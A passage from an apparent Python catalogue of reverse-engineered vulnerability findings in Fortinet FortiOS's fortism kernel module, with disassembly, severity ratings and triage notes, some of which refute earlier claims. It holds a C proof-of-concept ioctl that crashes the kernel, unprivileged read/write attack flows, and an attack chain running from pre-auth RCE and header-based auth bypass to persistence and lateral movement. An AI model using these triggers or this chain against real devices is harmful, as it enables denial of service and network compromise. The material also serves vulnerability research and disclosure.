        "directly to the user-supplied pointer (r12 = ioctl arg) without any privilege check. "
        "The 4 bytes at 0x81889310 are a Fortinet-internal state value (type or count field), "
        "but more importantly the operation confirms that the fortism ioctl hook executes "
        "kernel-to-user memory copies for any caller. "
        "If the 4-byte value contains or is influenced by randomized kernel addresses, "
        "this is a KASLR bypass. Even if not, it leaks internal fortism state to any user process."
    ),

    "vmlinux": {
        "vma_ioctl_handler": "0xffffffff80552080",
        "vma_0x9005_branch": "0xffffffff805521f0",
        "kernel_src_addr":   "0xffffffff81889310",
        "kernel_src_foff":   "0x1489310 (in .data section)",
        "copy_size":         "4 bytes",
    },

    "asm": """
; ioctl 0x9005 path at 0xffffffff805521f0:
mov edx, 4
mov rsi, 0xffffffff81889310   ; kernel .data global (hardcoded)
mov rdi, r12                   ; r12 = ioctl arg = user destination pointer
call copy_to_user              ; 0x5f6bbd: leaks 4 bytes to userspace
test rax, rax
jne error                      ; -EFAULT if user ptr invalid
xor r12d, r12d                 ; return 0 on success
""",

    "trigger": """
// Any process, no root required.
uint32_t leaked_val;
ioctl(any_fd, 0x9005, &leaked_val);
// leaked_val contains 4 bytes from kernel 0xffffffff81889310
""",

    "impact": (
        "Leaks 4 bytes from kernel .data to any unprivileged user process. "
        "If the value at 0x81889310 is address-derived or contains pointer fragments, "
        "enables KASLR bypass -> defeats kernel ASLR protection, enabling follow-on exploitation "
        "of FGT-F11 or other kernel memory corruption primitives."
    ),

    "ramdump_analysis": {
        "live_value_hex":   "0x9f1bb0bc",
        "live_value_type":  "runtime state counter/epoch — NOT a kernel pointer",
        "kaslr_bypass":     False,
        "rationale": (
            "Ramdump read at phys 0x2889310 (VMA 0x81889310): 4-byte value = 0x9f1bb0bc. "
            "Top 32 bits are 0x00000000 in the full 8-byte read (0xae8537c19f1bb0bc reflects "
            "two adjacent 32-bit fields). Value does not have 0xffff... kernel pointer prefix. "
            "Cross-checking static vmlinux: .data BSS-zero at foff 0x1889310, confirming it is "
            "a dynamically assigned runtime value. "
            "Write site (vma 0x8055d948): `mov dword ptr [rip+disp], 1` during fortism init "
            "path (after successful registration call). Value later changes to 0x9f1bb0bc, "
            "suggesting it is incremented/modified during module operation (epoch or session counter). "
            "12 RIP-relative readers in the 0x554xxx-0x55dxxx range all perform 32-bit reads. "
            "Conclusion: this is a Fortinet internal session-state counter, NOT a kernel address. "
            "KASLR bypass REFUTED. Finding remains MEDIUM: kernel internal state leaked without "
            "privilege check to any caller."
        ),
    },

    "status": "CONFIRMED — unauthorized kernel state leak via copy_to_user(user_ptr, 0x81889310, 4); "
              "live value 0x9f1bb0bc is runtime counter (NOT address material); KASLR bypass REFUTED",
}

# ─────────────────────────────────────────────────────────
# FGT-F12: Null pointer dereference in fortism type-7 chain walker
# FortiOS 7.4.12 vmlinux — Ablation BERT sweep; fortism hook at 0x551407
# ─────────────────────────────────────────────────────────
FGT_F12_FORTISM_NULL_CHAIN = {
    "id":       "FGT-F12",
    "product":  "Fortinet FortiGate FortiOS 7.4.12 VM64-KVM (fortism LSM module)",
    "severity": "MEDIUM",
    "class":    "Null Pointer Dereference in LSM Hook (kernel panic / DoS)",

    "description": (
        "The fortism hook at vma 0xffffffff80551407 (likely fortism_inode_setattr or "
        "fortism_path_rename based on its type dispatch) contains a type-7 branch that walks "
        "a linked list via `[r13+0x30]->next`. The null check at 0x80551480 (`test rdx, rdx; je`) "
        "fires for the first element only. The chain-walk at 0x5514c7 does: "
        "`mov rax, [r13+0x30]; mov rax, [rax]; mov [r13+0x30], rax` with only a sentinel-value "
        "check (`cmp rax, 0x8165f620`) before the dereference, not a null check. "
        "If the linked list contains a null mid-chain (uninitialized allocation or concurrent modification), "
        "the kernel dereferences null and panics. The sentinel is Fortinet-specific and not "
        "the standard Linux list head pattern."
    ),

    "vmlinux": {
        "vma":    "0xffffffff80551407",
        "foff":   "0x551407",
        "type_dispatch_at": "0xffffffff8055146d",
        "chain_walk_at":    "0xffffffff805514c7",
    },

    "asm_key_sequence": """
; type-7 dispatch at 0xffffffff8055146d:
mov eax, dword ptr [r13 + 0x58]   ; type field
cmp eax, 7
jne other_cases
; type-7 path:
mov eax, dword ptr [r14 + 0x428]  ; field in outer structure
test eax, eax
jne 0xffffffff80551971             ; if set, take alternate path
mov rax, [r13 + 0x30]             ; DEREF 1 — load list head (checked for null earlier)
mov rax, [rax]                    ; DEREF 2 — load next pointer — NULL IF MID-CHAIN NULL
mov [r13 + 0x30], rax             ; advance list
mov [r13 + 0x50], 0               ; clear field
mov [r13 + 0x40], 0
mov [r13 + 0x48], 0
; check for sentinel (not null):
cmp rax, 0xffffffff8165f620       ; SENTINEL CHECK — skips null
je sentinel_exit
""",

    "crash_point_analysis": {
        "crash_vma":     "0xffffffff80551519",
        "crash_foff":    "0x551519",
        "crash_insn":    "mov eax, dword ptr [r14 + 0x10]",
        "chain":         (
            "Chain walk at 0x5514c7: rax = [[r13+0x30]] (next ptr of current element). "
            "If next ptr is null: rax=0 stored to [r13+0x30] at 0x5514ce. "
            "Sentinel check at 0x5514fa: cmp rax, 0xffffffff8165f620 -- null != sentinel, no branch. "
            "Fall-through: 0x551506: mov r14, [r13+0x30] -- r14 = null. "
            "Crash: 0x551519: mov eax, [r14+0x10] -- deref null+0x10 = page fault -> kernel panic."
        ),
        "trigger_analysis": (
            "Type=7 is a TRANSIENT state in the fortism object state machine. "
            "After the chain walk, type is immediately set to 1 (0x5514f2). "
            "The state machine is driven by a loop: add [r13+0x58], 1 at 0x5515f2; "
            "type increments through processing loop. Type=7 is reached after 6 loop iterations. "
            "Mid-chain null requires list corruption prior to type=7: "
            "(a) concurrent list modification race, (b) prior memory corruption bug, "
            "or (c) Fortinet list-building bug that omits sentinel for certain list lengths. "
            "NOT directly triggerable from unprivileged user-space without a prerequisite condition."
        ),
    },

    "impact": "Kernel panic via null-ptr dereference -> system reboot. Reachable on any path that creates a fortism object with type=7 and a mid-chain null in its processing list.",
    "status": "CANDIDATE -- NARROWED: crash point confirmed at 0xffffffff80551519 (r14=null dereference); trigger requires mid-chain null in fortism processing list; type=7 is transient (6 loop iterations); direct trigger from user-space requires prerequisite list corruption",
}

# ─────────────────────────────────────────────────────────
# FGT-F13: fortism global security flag set without capability check
# FortiOS 7.4.12 vmlinux — fortism hook at 0x55e297
# ─────────────────────────────────────────────────────────
FGT_F13_FORTISM_GLOBAL_FLAG = {
    "id":       "FGT-F13",
    "product":  "Fortinet FortiGate FortiOS 7.4.12 VM64-KVM (fortism LSM module)",
    "severity": "MEDIUM",
    "class":    "Missing Privilege Check Before Global Security Flag Write",

    "description": (
        "The fortism hook at vma 0xffffffff8055e297 (confirmed by function pointer in "
        "fortism LSM hook structure at .rodata 0x123d3b8) acquires a mutex on the global "
        "fortism state at 0x816609e0, writes the value 1 to a global flag at "
        "`[rip + 0x1102763]` (= approximately 0xffffffff81661ffa), then releases the mutex. "
        "There is no capability check (no capable(), no ns_capable(), no CAP_SYS_ADMIN) "
        "before the mutex acquisition. If this hook is invoked via an LSM path reachable "
        "from a Fortinet CLI user context that does not have full kernel capability, "
        "it can flip the global enforcement flag, potentially disabling fortism enforcement system-wide."
    ),

    "vmlinux": {
        "vma":   "0xffffffff8055e297",
        "foff":  "0x55e297",
        "rodata_hook_ptr_at": "0x123d3b8",
        "global_flag_approx_vma": "0xffffffff81661ffa",
    },

    "asm": """
0xffffffff8055e297  mov rdi, 0xffffffff816609e0   ; mutex addr
0xffffffff8055e29e  call mutex_lock               ; no capability check before this
0xffffffff8055e2a3  test eax, eax
0xffffffff8055e2a5  js fail
0xffffffff8055e2ab  mov dword ptr [rip + 0x1102763], 1  ; GLOBAL FLAG SET
0xffffffff8055e2b5  mov rdi, 0xffffffff816609e0
0xffffffff8055e2bc  call mutex_unlock
0xffffffff8055e2c1  mov eax, 1
0xffffffff8055e2c6  pop rbp
0xffffffff8055e2c7  ret
""",

    "impact": "If reachable from unprivileged context: globally disables fortism LSM enforcement for all processes on the system.",

    "static_analysis": {
        "hook_name_string": (
            "Rodata at foff 0x123d370-0x123d380 contains the string 'fortism_check_mm_maps' "
            "immediately preceding the hook function pointer (rodata foff 0x123d3b8 = pointer "
            "to 0xffffffff8055e297). Pattern confirmed: rodata string precedes each hook entry "
            "in the fortism hook table. Adjacent entry: 'fortism_bprm_check_security' at "
            "0x123d350-0x123d368 -> pointer at 0x123d3a8 = 0xffffffff8044825d. "
            "Hook identity: 'fortism_check_mm_maps' = Fortinet-named mmap_addr LSM hook "
            "(kernel hook: security_mmap_addr, called for every mmap() syscall)."
        ),
        "flag_semantics": (
            "Global flag at 0xffffffff81660a18 is a 3-state init counter. "
            "3 references found via full .text RIP-relative scan: "
            "  WRITE at 0x55e2ab: mov [flag], 1 (this hook, flag 0->1). "
            "  READ  at 0x55e2e2: cmp [flag], 2; setne al; ret "
            "    => returns 1 when flag != 2 (not fully initialized). "
            "  READ  at 0x55eb6b: same pattern (cmp [flag], 2). "
            "Flag=2 requires a separate write path not in fortism region "
            "(likely module init routine executed at load time). "
            "Impact narrowed: this hook triggers 0->1 from any unprivileged mmap(), "
            "NOT a direct MAC bypass. Enforcement requires flag=2 from a privileged path."
        ),
        "revised_impact": (
            "Hook fires on mmap_addr without privilege check. Flag write (0->1) "
            "races with module init that sets flag=2. All enforcement checks compare "
            "to 2 (not to 1), so flag=1 does not enable or disable enforcement. "
            "Missing capability check confirmed; practical impact LOW -- the unprivileged "
            "flag write does not grant access beyond what the 0->1 state represents, "
            "and that state is pre-enforcing by design."
        ),
    },

    "status": "CANDIDATE -- NARROWED: hook = 'fortism_check_mm_maps' (mmap_addr); flag is 3-state init counter; hook sets flag 0->1 (not 1->0); enforcement gate checks for flag==2; unprivileged trigger confirmed but NOT a MAC bypass; impact LOW",
}

# ─────────────────────────────────────────────────────────
# FGT-F14: fortism_inode_alloc_security partial failure -> memory leak
# FortiOS 7.4.12 vmlinux — hooks at 0x5511f5 (alloc) and 0x5511d0 (free)
# ─────────────────────────────────────────────────────────
FGT_F14_FORTISM_INODE_MEMLEAK = {
    "id":       "FGT-F14",
    "product":  "Fortinet FortiGate FortiOS 7.4.12 VM64-KVM (fortism LSM module)",
    "severity": "LOW",
    "class":    "Memory Leak in LSM inode_alloc_security Error Path",

    "description": (
        "The fortism inode security allocation hook at vma 0xffffffff805511f5 allocates two "
        "kernel objects: a primary security blob (r12) and an inner structure at [r12+0x60]. "
        "On failure of the inner allocation, the code jumps to 0x80551267 without freeing r12 "
        "and without zeroing [r12+0x60] before storing r12 into the inode's security pointer "
        "[rbx+0xc0]. The corresponding free hook at 0xffffffff805511d0 calls kfree([r12+0x60]) "
        "then kfree(r12). If the inner alloc failed and [r12+0x60] was never initialized to zero "
        "before the jump, the free hook operates on garbage memory at [r12+0x60], "
        "potentially freeing an arbitrary kernel pointer. "
        "NOTE: In the observed disassembly, [r12+0x60] is stored BEFORE the null check "
        "(0x551248 stores, 0x551250 checks, 0x551252 stores r12 into inode). "
        "If the second alloc is null, the inode's [+0xc0] does NOT get r12 stored "
        "(store is at 0x551252, AFTER the failure jump at 0x551250), so r12 leaks without a crash."
    ),

    "vmlinux": {
        "alloc_hook_vma": "0xffffffff805511f5",
        "free_hook_vma":  "0xffffffff805511d0",
        "inner_alloc_failure_jump": "0xffffffff80551267",
        "inode_secblob_store": "0xffffffff80551252",
    },

    "impact": "Kernel memory leak of one kmalloc slab object per inode creation under memory pressure. No immediate security impact; contributes to slab exhaustion over time.",
    "status": "CONFIRMED — code flow analyzed; triggers under kmalloc failure (memory pressure or KASAN injection)",
}

# ─────────────────────────────────────────────────────────
# Attack chain: FortiGate VM RE -> exploitation
# ─────────────────────────────────────────────────────────
ATTACK_CHAIN = {
    "summary": "FortiOS 7.0.9 — anonymous network access to full compromise",
    "steps": [
        {
            "step": 1,
            "action": "SSL-VPN pre-auth RCE via CVE-2023-27997",
            "detail": "POST /remote/fgt_lang?lang=<payload> — heap overflow, no auth required",
            "finding": "FGT-F05",
            "impact": "RCE as /bin/init (65MB monolith = all services)",
        },
        {
            "step": 2,
            "action": "Alt: HA trust header injection",
            "detail": "If management port accessible, inject X-ADMIN-SUPER:1 to skip auth",
            "finding": "FGT-F04",
            "impact": "Admin API access without credentials",
        },
        {
            "step": 3,
            "action": "Persist via API or config modification",
            "detail": "/api/v2/cmdb/system/admin — add admin account or SSH key",
            "finding": "FGT-F08",
        },
        {
            "step": 4,
            "action": "Lateral movement via IPsec/SSL-VPN trust",
            "detail": "FGT controls VPN for downstream network; extract PSKs/certs from config",
        },
    ],
}

# ─────────────────────────────────────────────────────────
# FGT-F16: Integer overflow -> kernel DoS in FortiOS 8.0.0 (FGT-F11 homolog)
# FortiOS 8.0.0 VM64-KVM vmlinux — fortism ioctl handler at 0x55c546 (ioctl 0x9007 branch)
# Confirmed via cross-version Ablation BERT homolog tracking + direct disassembly
# ─────────────────────────────────────────────────────────
FGT_F16_800_IOCTL_HEAP_OVERFLOW = {
    "id":       "FGT-F16",
    "product":  "Fortinet FortiGate FortiOS 8.0.0 VM64-KVM (fortism kernel module)",
    "severity": "CRITICAL",
    "class":    "Integer Overflow -> Kernel DoS via fortism LSM file_ioctl hook (FGT-F11 homolog)",

    "description": (
        "Identical vulnerability class to FGT-F11 (FortiOS 7.4.12), confirmed present in 8.0.0. "
        "The fortism LSM file_ioctl hook moved to vma 0xffffffff8055c546 in 8.0.0. "
        "The ioctl 0x9007 integer overflow path is at 0x55c73d: "
        "`lea edi, [rax+1]` with rax=0xffffffff wraps edi to 0; "
        "kmalloc(0) returns a valid zero-size SLUB allocation; "
        "`movsxd rdx, [rbp-0x5c]` sign-extends 0xffffffff to SIZE_MAX; "
        "copy_from_user(heap_buf, user_str, SIZE_MAX) triggers error path; "
        "copy_from_user at 0x601b2e has the same error-path bug: "
        "TWO error paths (overflow jb + addr_limit jb) both reach memset(heap_buf, 0, SIZE_MAX); "
        "rep stosq from heap_buf until unmapped page -> kernel crash. "
        "No privilege required; any fd works."
    ),

    "vmlinux_800": {
        "binary":  "FortiOS 8.0.0 vmlinux (extracted from flatkc bzImage, P1 of FGT_VM64_KVM-v8.0.0.F-build0167)",
        "buildid": "474e550043e6c79f25c4e6509765325de60ad04e",
        "vma_handler":     "0xffffffff8055c546",
        "foff_handler":    "0x55c546",
        "vma_0x9007_path": "0xffffffff8055c73d",
        "foff_0x9007":     "0x55c73d",
        "vma_copy_from_user": "0xffffffff80601b2e",
        "foff_copy_from_user": "0x601b2e",
    },

    "asm_critical_path_0x9007": """
; 8.0.0 ioctl 0x9007 path at 0xffffffff8055c73d (identical semantics to 7.4.12):
mov edx, 0x10
mov rsi, r12                           ; user pointer (ioctl arg)
lea rdi, [rbp - 0x60]
call copy_from_user(stack, user, 16)   ; {word0[4], word1_length[4], string_ptr[8]}

mov eax, [rbp - 0x5c]                 ; word1 (user-controlled LENGTH)
lea edi, [rax + 1]                     ; 32-BIT OVERFLOW: 0xffffffff+1 = 0
movsxd rdi, edi                        ; sign-extend: rdi=0
call kmalloc(0, GFP_KERNEL)            ; valid zero-size SLUB allocation

movsxd rdx, [rbp - 0x5c]              ; SIZE_MAX (sign-extend 0xffffffff)
mov rsi, [rbp - 0x58]                  ; user string_ptr
mov rdi, rax                            ; zero-size heap buf
call copy_from_user(heap, user, SIZE_MAX)
; copy_from_user error path (overflow detected):
;   jb -> memset(heap_buf, 0, SIZE_MAX) -> rep stosq -> kernel crash
""",

    "copy_from_user_error_path": {
        "overflow_jb":    "0x601b51: add rax,r12 (overflow) -> jb 0x601b75 -> memset(dst,0,SIZE_MAX)",
        "addr_limit_jb":  "0x601b56: jb 0x601b8a -> rax=SIZE_MAX; jmp 0x601b62 -> jne 0x601b6c -> sub/add -> 0x601b75",
        "memset_call":    "0x601b7d: call 0xce5010 (rep stosq memset) with rdx=SIZE_MAX, rdi=heap_buf, esi=0",
        "both_paths_trigger_dos": True,
    },

    "trigger_poc": """
// Identical to FGT-F11 PoC. No root required. Any process, any fd.
int fd = open("/dev/null", O_RDONLY);
void *user_region = mmap(NULL, 4096, PROT_READ, MAP_ANON|MAP_PRIVATE, -1, 0);
struct { uint32_t word0; uint32_t word1; uint64_t string_ptr; }
    payload = {1, 0xffffffff, (uint64_t)user_region};
ioctl(fd, 0x9007, &payload);
// -> kernel crash via memset(heap_buf, 0, SIZE_MAX) in copy_from_user error path
""",

    "cross_version_tracking": {
        "method": "Ablation BERT cross-version homolog tracking + rodata function pointer scan",
        "7412_foff": "0x552080 (handler), 0x55227e (0x9007 path)",
        "800_foff":  "0x55c546 (handler), 0x55c73d (0x9007 path)",
        "offset_delta": "0xa4c6 bytes from 7.4.12 to 8.0.0 (handler), 0xa4bf (0x9007 path)",
        "rodata_hook_foff_800": "0x123cc88 (fortism LSM hooks structure, +0x60 from base)",
    },

    "status": "CRITICAL — DoS confirmed by structural analysis; same memset(heap,0,SIZE_MAX) bug in 8.0.0 copy_from_user",

    "arm64_architecture_note": {
        "image_file": "FGT_ARM64_KVM-v8.0.0.F-build0167-FORTINET.qcow2 -> flatkc_arm64",
        "ioctl_0x9007_arm64_foff": "0x2dfa2c",
        "arm64_integer_overflow": (
            "SAME overflow present: `add w0, w0, #1` on w0=0xffffffff -> w0=0 (32-bit). "
            "`sxtw x0, w0` -> x0=0. `bl kmalloc(0)` -> SLUB ptr."
        ),
        "arm64_dos_status": (
            "NOT confirmed. ARM64 uses standard Linux ARM64 copy_from_user at 0x93d9c0. "
            "access_ok correctly uses ARM64 overflow-safe pattern (adds+csel+csinv+sbcs+cset). "
            "For SIZE_MAX len: `adds x1, x1, x19` (src + SIZE_MAX) sets Carry for any nonzero src. "
            "`csel x2, xzr, x2, hi` zeros addr_limit on overflow, causing sbcs check to fail. "
            "access_ok returns FAIL -> branch to EFAULT error path WITHOUT any memset. "
            "ARM64 error path at 0x2dfb7c/0x2dfb90 returns EFAULT only. "
            "Kernel panic does NOT occur. FGT-F16 DoS is x86-64 specific (custom Fortinet copy_from_user bug)."
        ),
        "arm64_kmalloc_0_note": (
            "Integer overflow (kmalloc(0)) does occur in ARM64 as in x86-64. "
            "However without the follow-on SIZE_MAX copy_from_user crash, "
            "the SLUB ptr is freed cleanly -> no exploitable primitive."
        ),
    },
}

# ─────────────────────────────────────────────────────────
# FGT-F17: Kernel info leak via fortism ioctl 0x9005 in FortiOS 8.0.0 (FGT-F15 homolog)
# FortiOS 8.0.0 vmlinux — fortism ioctl handler 0x55c546, ioctl 0x9005 branch at 0x55c6b0
# ─────────────────────────────────────────────────────────
FGT_F17_800_IOCTL_INFOLEAK = {
    "id":       "FGT-F17",
    "product":  "Fortinet FortiGate FortiOS 8.0.0 VM64-KVM (fortism kernel module)",
    "severity": "MEDIUM",
    "class":    "Kernel Information Leak via fortism ioctl 0x9005 — 8.0.0 homolog of FGT-F15",

    "description": (
        "Identical vulnerability class to FGT-F15 (FortiOS 7.4.12). "
        "In 8.0.0 ioctl 0x9005 path (vma 0xffffffff8055c6b0): "
        "`mov rsi, 0xffffffff8188a410; mov rdi, r12; call copy_to_user(r12, 0x8188a410, 4)`. "
        "Source address changed from 7.4.12's 0x81889310 to 0x8188a410. "
        "Same: no privilege check, leaks 4 bytes of kernel .data to any caller. "
        "0x8188a410 is a BSS-zero in static vmlinux (.data section); runtime value "
        "is a Fortinet internal state counter (same class as FGT-F15's 0x81889310)."
    ),

    "vmlinux_800": {
        "vma_0x9005_branch":  "0xffffffff8055c6b0",
        "foff_0x9005":        "0x55c6b0",
        "kernel_src_addr":    "0xffffffff8188a410",
        "copy_size":          "4 bytes",
        "vs_7412_src_addr":   "0xffffffff81889310 (changed by 0x10100 between versions)",
    },

    "asm": """
; 8.0.0 ioctl 0x9005 at 0xffffffff8055c6b0:
mov edx, 4
mov rsi, 0xffffffff8188a410   ; kernel .data global (8.0.0 address)
mov rdi, r12                   ; user destination pointer (ioctl arg)
call copy_to_user              ; 0x601b00: leaks 4 bytes to userspace, no priv check
test rax, rax
jne error
xor ebx, ebx                   ; return 0 on success
""",

    "status": "CONFIRMED — same unauthorized kernel state leak pattern as FGT-F15; source address updated for 8.0.0",
}

# ─────────────────────────────────────────────────────────
# FGT-F18: LSM hook unconditional zero return (CANDIDATE)
# Affects: FortiOS 8.0.0 (foff 0x55b4b0); 7.4.12 homolog not yet located
# ─────────────────────────────────────────────────────────
FGT_F18_LSM_HOOK_ZERO_RETURN = {
    "id":       "FGT-F18",
    "product":  "Fortinet FortiGate FortiOS 8.0.0 VM64-KVM (fortism kernel module)",
    "severity": "CANDIDATE — class TBD pending hook type identification",
    "class":    "LSM hook unconditional zero return — potential auth bypass",

    "vmlinux_800": {
        "buildid":      "474e550043e6c79f25c4e6509765325de60ad04e",
        "foff_hook":    "0x55b4b0",
        "vma_hook":     "0xffffffff8055b4b0",
        "rodata_position": "fortism LSM hooks table + 0x60 (sixth pointer slot from base 0x123cc68)",
    },

    "disassembly": """\
push rbp
mov rbp, rsp
push rbx
mov rbx, qword ptr [rsi + 0xc0]    ; deref arg1+0xc0 -> inner struct (rbx)
mov rdi, qword ptr [rbx + 0x60]    ; load child ptr from inner struct+0x60
call 0xffffffff8042774f              ; touch/reference child ptr (page-table walk)
mov rdi, rbx                         ; restore inner struct
call 0xffffffff8042774f              ; touch/reference inner struct
xor eax, eax                         ; UNCONDITIONAL: return 0 (allow)
pop rbx
pop rbp
ret
""",

    "called_function_0x42774f": (
        "Page-table-based memory reference function. "
        "Takes a kernel VA in rdi. Computes page-table entry via "
        "(va + 0x80000000) >> 12 << 6 + table_base, checks a flag at entry+8 bit 0, "
        "then conditionally calls 0x42694b with entry+0x18. "
        "Appears to be a kmap/memory-touch operation, NOT a security check. "
        "Return value ignored by the hook."
    ),

    "bert_evidence": (
        "BERT sweep hit 7 patterns: AUTH_BYPASS, KEY_MGMT, CRYPTO_WEAK, PRIV_ESC, "
        "RACE_CONDITION, SIGNED_VERIFY_BYPASS, INTEGER_OVERFLOW. "
        "Highest cross-query hit count in the 929-function corpus. "
        "Score 0.387 (RACE_CONDITION query)."
    ),

    "hook_identification": {
        "method": "rodata hook table scan — hook at table_base+0x60",
        "args_observed": "(rdi=?, rsi=struct_with_inner_at_0xc0)",
        "possible_hooks": [
            "fortism_cred_free (cleanup — zero return correct)",
            "fortism_bprm_committing_creds (setup — zero return allows)",
            "fortism_task_free (cleanup — zero return correct)",
            "fortism_inode_free_security (cleanup — zero return correct)",
        ],
        "dangerous_if": (
            "Hook is fortism_inode_permission, fortism_file_permission, "
            "fortism_task_kill, or any access-control hook. "
            "In those cases: unconditional zero return bypasses ALL fortism "
            "mandatory access control for the affected operation system-wide."
        ),
        "resolution_needed": "Dynamic tracing (ftrace/kprobe on hook entry) to identify call site",
    },

    "called_function_0x42774f_full_analysis": (
        "0x42774f is a PAGE TABLE WALK function, not a refcount or security check. "
        "It computes: page_index = (rdi + 0x80000000) >> 12; "
        "pte_ptr = pagetable_base + page_index * 64; "
        "then tests the PRESENT bit (bit 0) of pte_ptr->flags. "
        "Two indirect calls at the entry (via 0x81626bc0 and 0x81626bd0) are likely "
        "virt_to_page or pfn_to_page trampolines. "
        "The overall operation is: pre-touch the pages backing the security context objects "
        "to ensure they are resident in memory (page fault avoidance). "
        "This is a performance optimization, NOT a security enforcement operation."
    ),

    "resolution": (
        "RESOLVED-NOT-EXPLOITABLE. "
        "FGT-F18 is a MEMORY PRE-TOUCH hook, not an access-control hook. "
        "The function walks page tables for rsi->0xc0->0x60 and rsi->0xc0 (two nested security "
        "context objects), verifying/touching their physical pages, then returns 0. "
        "Unconditional return 0 is correct for this operation class -- it does not "
        "make a security permit/deny decision at all. "
        "The original BERT hit (7 patterns including AUTH_BYPASS, PRIV_ESC) was a FALSE POSITIVE: "
        "the semantic embedding matched the pattern of 'function that always allows' but "
        "the function is not an authorization gate. "
        "No CVE-worthy finding. Downgraded from CANDIDATE to INFO."
    ),

    "status": "RESOLVED-NOT-EXPLOITABLE -- page-table pre-touch hook; no security decision made; BERT false positive",
}

# ─────────────────────────────────────────────────────────
# FGT-F19: Ioctl 0x9004 unauth write to kernel object field+0x44
# Affects: FortiOS 7.4.12 AND 8.0.0 (same pattern)
# ─────────────────────────────────────────────────────────
FGT_F19_IOCTL_0x9004_UNAUTH_WRITE = {
    "id":       "FGT-F19",
    "product":  "Fortinet FortiGate FortiOS 7.4.12 + 8.0.0 VM64-KVM (fortism kernel module)",
    "severity": "HIGH — conditional (impact determined by runtime object+0x44 semantics)",
    "class":    "Unprivileged write to kernel object field via fortism ioctl 0x9004",

    "versions": {
        "7412_x86": {
            "foff_cmp_0x9004":   "0x5520c7",
            "foff_write_insn":   "0x55210b",
            "write_insn":        "mov dword ptr [rax + 0x44], r12d",
            "object_lookup":     "0x5528b8",
        },
        "800_x86": {
            "foff_cmp_0x9004":   "0x55c58b",
            "foff_write_insn":   "0x55c5cf",
            "write_insn":        "mov dword ptr [rax + 0x44], ebx",
            "object_lookup":     "0x55ce3b",
        },
        "800_arm64": {
            "image_file":        "FGT_ARM64_KVM-v8.0.0.F-build0167-FORTINET.qcow2 -> flatkc_arm64",
            "foff_cmp_0x9004":   "0x2df76c (movz w0, #0x9004; cmp w19, w0)",
            "foff_write_insn":   "0x2df7e0",
            "write_insn":        "str w19, [x0, #0x44]  (ARM64 DWORD store)",
            "object_lookup":     "0x2e03f0",
            "access_ok":         "correct — standard Linux ARM64 pattern (adds+csel+csinv+sbcs+cset)",
            "privilege_gate":    "absent — same as x86-64 (no gate before 0x9004 path)",
            "note": (
                "ARM64 handler is structurally identical to x86-64. "
                "MOV+CMP instruction pair used in place of x86 direct CMP immediate. "
                "FGT-F19 confirmed cross-architecture."
            ),
        },
    },

    "attack_flow": """\
; User-supplied struct: { uint32_t index; int32_t new_value; }
; Call: ioctl(any_fd, 0x9004, &user_struct)
;
; ioctl 0x9004 path (no privilege check):
copy_from_user(&kbuf, user_ptr, 8)   ; read 8 bytes: [0:4]=index, [4:8]=new_value
mov edi, kbuf[0:4]                    ; index
cmp edi, 0x40                          ; bounds check: index <= 64
ja  -> EINVAL
call object_lookup(index)             ; rax = object_table[index * 8]
; object_lookup: rax = [0x8188a440 + index * 8]  (runtime-populated)
test rax, rax
je  -> ENULL
movsxd rbx, kbuf[4:8]                 ; sign-extend new_value
mov dword ptr [rax + 0x44], ebx       ; WRITE: object->field_0x44 = new_value
return 0
""",

    "privilege_comparison": {
        "0x9002": "PRIVILEGED — gate: task_struct security blob == Fortinet sentinel 0xffffffff81646b40 (8.0.0)",
        "0x9003": "UNPRIVILEGED — read path (see FGT-F20)",
        "0x9004": "UNPRIVILEGED — write path (THIS FINDING)",
        "0x9005": "UNPRIVILEGED — info leak (FGT-F15/F17)",
        "0x9007": "UNPRIVILEGED — heap alloc+copy (FGT-F11/F16)",
        "0x9009": "UNPRIVILEGED — read field+0x30 from object",
    },

    "object_table": {
        "vma":          "0xffffffff8188a440",
        "foff_800":     "0x188a440 (DATA section)",
        "slot_count":   65,
        "slot_size":    8,
        "runtime_note": (
            "All 65 slots are NULL in the static binary. "
            "Populated at runtime by Fortinet daemons (miglogd, fcnacd, etc.) "
            "calling fortism's registration interface. "
            "Objects are accessible as soon as any daemon registers them."
        ),
    },

    "field_0x44_analysis": {
        "object_0x9003_readable_range": "fields +4 through +32 (28 bytes — see FGT-F20)",
        "field_0x44_position": "+68 bytes from object base — outside 0x9003 readable range",
        "field_0x30_via_0x9009": "readable via ioctl 0x9009 (sign-extended, returned directly)",
        "unknown": (
            "field+0x44 semantics require dynamic analysis or daemon source. "
            "Candidates: security_level, capability_mask, mode_flags, refcount. "
            "Writing -1 (0xffffffff) or 0 may escalate or suppress security enforcement."
        ),
    },

    "status": (
        "CONFIRMED attack primitive — any process can write 32-bit value to "
        "kernel object field+0x44 via bounded (0..0x40) index. "
        "Impact = HIGH if field+0x44 is a security-relevant flag; "
        "MEDIUM if it is an application-layer counter. "
        "Exploitability confirmed once runtime object structure is known."
    ),
}

# ─────────────────────────────────────────────────────────
# FGT-F20: Ioctl 0x9003 unauth read of 28 bytes from kernel object
# Affects: FortiOS 7.4.12 AND 8.0.0 (same pattern)
# ─────────────────────────────────────────────────────────
FGT_F20_IOCTL_0x9003_UNAUTH_READ = {
    "id":       "FGT-F20",
    "product":  "Fortinet FortiGate FortiOS 7.4.12 + 8.0.0 VM64-KVM (fortism kernel module)",
    "severity": "MEDIUM — kernel object fields exposed without privilege check",
    "class":    "Unprivileged read of kernel object internal fields via fortism ioctl 0x9003",

    "versions": {
        "7412_x86": {
            "foff_handler_entry": "0x55220e",
        },
        "800_x86": {
            "foff_handler_entry": "0x55c6cd",
        },
        "800_arm64": {
            "foff_handler_entry":   "0x2df964",
            "read_method":          "ldp x2,x3,[x0+4]; stp to stack; ldr/str for remainder",
            "copy_to_user":         "0x93df80 (standard Linux ARM64 copy_to_user)",
            "confirmed":            True,
        },
    },

    "attack_flow": """\
; User-supplied struct: { uint32_t index; uint8_t pad[32]; }  (36 bytes total)
; Call: ioctl(any_fd, 0x9003, &user_struct)  -> fills user_struct with object data
;
; ioctl 0x9003 path (no privilege check):
copy_from_user(&kbuf, user_ptr, 36)   ; read 36 bytes: [0:4]=index
mov edi, kbuf[0:4]
cmp edi, 0x40
ja  -> EINVAL
call object_lookup(index)             ; rax = object_table[index * 8]
test rax, rax
je  -> ENULL
; Selectively copy object fields into kbuf:
kbuf[8:16]  = object[4:12]    ; via mov rdx,[rax+4]; mov [rbp-0x58],rdx
kbuf[16:24] = object[12:20]   ; via mov rdx,[rax+0xc]
kbuf[24:32] = object[20:28]   ; via mov rdx,[rax+0x14]
kbuf[32:36] = object[28:32]   ; via mov eax,[rax+0x1c] (DWORD only)
